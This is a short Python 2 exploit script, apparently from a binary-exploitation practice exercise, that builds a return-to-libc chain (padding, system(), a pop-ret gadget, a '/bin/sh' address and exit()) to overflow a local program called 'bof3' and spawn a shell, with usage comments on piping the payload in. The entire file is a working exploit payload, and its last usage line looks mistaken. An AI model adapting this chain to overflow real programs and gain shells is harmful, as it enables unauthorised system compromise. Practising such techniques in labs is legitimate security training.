import struct

system_address = struct.pack("<L",0xf7e12420)

pop_address = struct.pack("I",0x8049022) # popret gadget

systeam_arguments = struct.pack("<L",0xf7f5c352) #/binsh

exit_address = struct.pack("I",0xf7e04f80)

exit_return = struct.pack("I",0x42424242)

exit_arguments = struct.pack("I",0x00000000)
# stack
# system -> popret -> /bin/sh -> exit() -> - garbage value (0xBBBB)


system_garbase = struct.pack("<L",0x42424242)

# libc 
# print (b'a'*40 +   system_address + b"BBBB" + systeam_arguments)
# -> Segmentation fault

# popret gadget
print (b'a'*40 + system_address + pop_address + systeam_arguments + exit_address + exit_return + exit_arguments)
# -> Not Segmentation fault

# [+] Usage
# python2 rtlchaning.py > exp
# cat exp - | ./bof3

# (python2 rtlchaning.py;cat) | exp